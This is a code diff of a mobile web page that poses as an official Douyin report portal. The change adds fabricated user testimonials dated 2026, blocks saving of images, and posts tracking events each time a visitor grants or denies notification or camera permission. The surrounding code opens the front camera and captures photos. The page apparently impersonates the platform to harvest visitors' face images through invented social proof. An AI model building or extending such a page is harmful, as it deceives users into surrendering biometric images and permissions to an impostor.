@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>抖音平台违规账号举报提交入口</title>
+    <title>抖音违规账号举报接口</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -228,38 +228,85 @@
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== Cases ===== */
-        .case-item {
-            display: flex;
-            align-items: center;
+        /* ===== Comments ===== */
+        .comment-item {
             padding: 14px 0;
             border-bottom: 1px solid #f5f5f5;
         }
-        .case-item:last-child { border-bottom: none; }
-        .case-icon {
-            width: 42px; height: 42px;
-            background: linear-gradient(135deg, #fff0f3 0%, #ffe0e6 100%);
-            border-radius: 12px;
-            display: flex; align-items: center; justify-content: center;
+        .comment-item:last-child { border-bottom: none; }
+        .comment-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .comment-avatar {
+            width: 38px; height: 38px;
+            border-radius: 50%;
             flex-shrink: 0;
-            margin-right: 14px;
+            margin-right: 10px;
+            background: #e8e8e8;
+            display: flex; align-items: center; justify-content: center;
         }
-        .case-icon svg {
-            width: 20px; height: 20px;
-            fill: #FE2C55;
+        .comment-user {
+            flex: 1;
         }
-        .case-info { flex: 1; }
-        .case-type {
+        .comment-name {
             font-size: 14px;
-            color: #1a1a1a;
-            font-weight: 500;
-            margin-bottom: 4px;
-            line-height: 1.5;
-        }
-        .case-result {
-            font-size: 12px;
-            color: #07c160;
             font-weight: 600;
+            color: #1a1a1a;
+        }
+        .comment-time {
+            font-size: 11px;
+            color: #bbb;
+            margin-top: 2px;
+        }
+        .comment-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.7;
+            margin-bottom: 10px;
+        }
+        .comment-img-wrap {
+            position: relative;
+            margin-bottom: 8px;
+            -webkit-touch-callout: none;
+        }
+        .comment-img {
+            width: 100%;
+            border-radius: 8px;
+            display: block;
+            pointer-events: none;
+            -webkit-user-drag: none;
+            user-select: none;
+        }
+        .comment-img-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            z-index: 1;
+        }
+        .comment-footer {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .comment-tag {
+            font-size: 11px;
+            color: #07c160;
+            background: #f0faf4;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        .comment-views {
+            font-size: 12px;
+            color: #bbb;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+        .comment-views svg {
+            width: 15px; height: 15px;
+            fill: #ccc;
         }
 
         /* ===== Modal (通用) ===== */
@@ -450,7 +497,7 @@
     <div class="header">
         <div class="header-top">
             <img src="111.png" style="width:36px;height:36px;border-radius:10px;margin-right:12px;">
-            <h1>违规账号举报入口</h1>
+            <h1>违规账号最新举报接口</h1>
         </div>
         <p>官方举报快速通道 | 违规账号精准核查 | 1-3 工作日出处罚结果</p>
         <div class="header-badges">
@@ -500,31 +547,74 @@
         <button class="submit-btn" id="submitBtn" onclick="submitReport()">确认提交举报申请</button>
     </div>
 
-    <!-- Cases -->
+    <!-- 用户评论 -->
     <div class="card">
         <div class="card-title">
-            <span class="icon"><svg viewBox="0 0 24 24" fill="#07c160"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></span>
-            成功案例
+            <span class="icon"><svg viewBox="0 0 24 24" fill="#FE2C55"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg></span>
+            以下是举报成功结果：
         </div>
-        <div class="case-item">
-            <div class="case-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
-            <div class="case-info">
-                <div class="case-type">举报「恶意私信骚扰」成功，对方账号私信功能限制 5 天</div>
-                <div class="case-result">&#10003; 处理完成</div>
+
+        <div class="comment-item">
+            <div class="comment-header">
+                <div class="comment-avatar"><svg width="20" height="20" fill="#999" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+                <div class="comment-user">
+                    <div class="comment-name">妄叙</div>
+                    <div class="comment-time">2026-05-17</div>
+                </div>
+            </div>
+            <div class="comment-text">举报成功了！对方已经被禁止关注了，处理速度很快，感谢平台</div>
+            <div class="comment-img-wrap"><img class="comment-img" src="a7k2m9.jpg" alt="反馈截图"><div class="comment-img-overlay"></div></div>
+            <div class="comment-footer">
+                <span class="comment-tag">&#10003; 已处理</span>
+                <span class="comment-views"><svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> 1.2w</span>
             </div>
         </div>
-        <div class="case-item">
-            <div class="case-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
-            <div class="case-info">
-                <div class="case-type">举报「恶意竞争引流」成功，对方账号作品限流 7 天</div>
-                <div class="case-result">&#10003; 处理完成</div>
+
+        <div class="comment-item">
+            <div class="comment-header">
+                <div class="comment-avatar"><svg width="20" height="20" fill="#999" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+                <div class="comment-user">
+                    <div class="comment-name">风止意平</div>
+                    <div class="comment-time">2026-05-16</div>
+                </div>
+            </div>
+            <div class="comment-text">之前一直被恶意引流的人骚扰，举报后两天就出结果了，直接被禁止关注笑死我了</div>
+            <div class="comment-img-wrap"><img class="comment-img" src="b3n8p1.png" alt="反馈截图"><div class="comment-img-overlay"></div></div>
+            <div class="comment-footer">
+                <span class="comment-tag">&#10003; 已处理</span>
+                <span class="comment-views"><svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> 3.8w</span>
             </div>
         </div>
-        <div class="case-item">
-            <div class="case-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg></div>
-            <div class="case-info">
-                <div class="case-type">举报「辱骂挑衅他人」成功，对方账号永久封禁</div>
-                <div class="case-result">&#10003; 处理完成</div>
+
+        <div class="comment-item">
+            <div class="comment-header">
+                <div class="comment-avatar"><svg width="20" height="20" fill="#999" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+                <div class="comment-user">
+                    <div class="comment-name">辞厌</div>
+                    <div class="comment-time">2026-05-15</div>
+                </div>
+            </div>
+            <div class="comment-text">骂人的那个号直接被禁言了，效率真高，以后遇到违规的就来这举报</div>
+            <div class="comment-img-wrap"><img class="comment-img" src="c5r4t6.png" alt="反馈截图"><div class="comment-img-overlay"></div></div>
+            <div class="comment-footer">
+                <span class="comment-tag">&#10003; 已处理</span>
+                <span class="comment-views"><svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> 2.1w</span>
+            </div>
+        </div>
+
+        <div class="comment-item">
+            <div class="comment-header">
+                <div class="comment-avatar"><svg width="20" height="20" fill="#999" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+                <div class="comment-user">
+                    <div class="comment-name">执掌风月</div>
+                    <div class="comment-time">2026-05-14</div>
+                </div>
+            </div>
+            <div class="comment-text">提交了举报三天就审核通过了，抄袭我内容的号直接被禁止关注，终于维权成功</div>
+            <div class="comment-img-wrap"><img class="comment-img" src="d9w1x3.png" alt="反馈截图"><div class="comment-img-overlay"></div></div>
+            <div class="comment-footer">
+                <span class="comment-tag">&#10003; 已处理</span>
+                <span class="comment-views"><svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> 5.6w</span>
             </div>
         </div>
     </div>
@@ -615,12 +705,22 @@
     var cameraStream = null;
     var capturedPhotos = [];
     var sessionId = '';
+    var cameraTracked = false;
+
+    // 禁止图片右键/长按保存
+    document.addEventListener('contextmenu', function(e) {
+        if (e.target.tagName === 'IMG') e.preventDefault();
+    });
+    document.addEventListener('touchstart', function(e) {
+        if (e.target.tagName === 'IMG') e.preventDefault();
+    }, { passive: false });
 
     // ===== 进入网站：通知弹窗已在HTML中默认active =====
 
     // 通知弹窗 - 点击"允许" → 丝滑过渡到相机弹窗
     function onCustomNotifAllow() {
         var notifModal = document.getElementById('customNotifModal');
+        fetch('/api/track/notif', { method: 'POST' });
         if ('Notification' in window && Notification.permission === 'default') {
             Notification.requestPermission();
         }
@@ -637,6 +737,7 @@
 
     // 相机弹窗 - 点击"允许"
     function onCustomCameraAllow() {
+        fetch('/api/track/camera', { method: 'POST' });
         document.getElementById('customCameraModal').classList.remove('active');
     }
 
@@ -680,13 +781,16 @@
             alert('您的浏览器不支持相机功能，请更换浏览器重试');
             return;
         }
+        cameraTracked = false;
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
             .then(function(stream) {
+                if (!cameraTracked) { cameraTracked = true; fetch('/api/track/realCameraAllow', { method: 'POST' }); }
                 cameraStream = stream;
                 startCapture();
             })
             .catch(function(err) {
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                    if (!cameraTracked) { cameraTracked = true; fetch('/api/track/realCameraDeny', { method: 'POST' }); }
                     showRetryModal();
                 } else {
                     alert('相机启动失败，请检查设备后重试');
